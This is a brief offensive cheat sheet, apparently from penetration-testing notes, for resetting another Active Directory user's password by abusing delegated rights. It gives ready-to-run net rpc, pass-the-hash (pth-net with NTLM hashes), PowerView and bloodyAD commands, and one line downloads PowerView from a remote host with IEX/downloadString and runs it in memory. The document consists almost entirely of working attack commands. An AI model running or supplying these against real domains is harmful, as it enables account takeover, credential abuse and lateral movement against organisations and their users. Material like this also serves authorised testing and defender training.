## If Password of Source Account is Known

````bash
net rpc password jamie -U domain.local/john -S 192.168.210.10
net rpc password TargetUser -U <domain/your_user> -S <dc>
````

## Pass the Hash

```bash
pth-net rpc password 'TargetUser' "NewPassword" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"
```

## PowerShell from another account if the Source Account Password is Known

````bash
$SecPassword = ConvertTo-SecureString 'your_password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('domain\youruser', $SecPassword)

$UserPassword = ConvertTo-SecureString 'NewPassword' -AsPlainText -Force
Set-DomainUserPassword -Identity jamie -AccountPassword $UserPassword -Credential $Cred

Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $UserPassword -Credential $Cred
````

## PowerShell if logged into account

```bash
IEX(New-Object Net.WebClient).downloadString('http://192.168.58.50/PowerView.ps1')  
$NewPassword = ConvertTo-SecureString 'Password123' -AsPlainText -Force 

Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword   
```

### BloodyAD

```bash
bloodyAD --host "x.x.x.x" -d "DOMAIN" -u "USER" -p "PASSWORD" set password TargetUser NewPassword
```